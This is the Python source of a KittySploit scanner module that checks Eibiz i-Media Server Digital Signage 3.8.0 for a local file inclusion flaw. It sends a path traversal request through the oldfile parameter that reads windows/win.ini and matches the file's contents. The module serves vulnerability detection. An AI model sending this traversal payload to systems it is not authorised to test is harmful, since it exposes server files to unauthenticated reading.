#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Eibiz i-Media Server Digital Signage 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Eibiz i-Media Server Digital Signage 3.8.0 - Local File Inclusion Detection',
        'description': "Eibiz i-Media Server Digital Signage 3.8.0 is vulnerable to local file inclusion. An unauthenticated remote attacker can exploit this to view the contents of files located outside of the server's root directory. The issue can be triggered through the oldfile GET parameter.",
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'lfi', 'eibiz', 'packetstorm', 'windows', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/158943/Eibiz-i-Media-Server-Digital-Signage-3.8.0-File-Path-Traversal.html',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/dlibrary/null?oldfile=../../../../../../windows/win.ini&library=null', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('bit app support', 'fonts', 'extensions',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="Eibiz i-Media Server Digital Signage 3.8.0 - Local File Inclusion detected",
                path='/dlibrary/null?oldfile=../../../../../../windows/win.ini&library=null',
            )
            return True
        return False

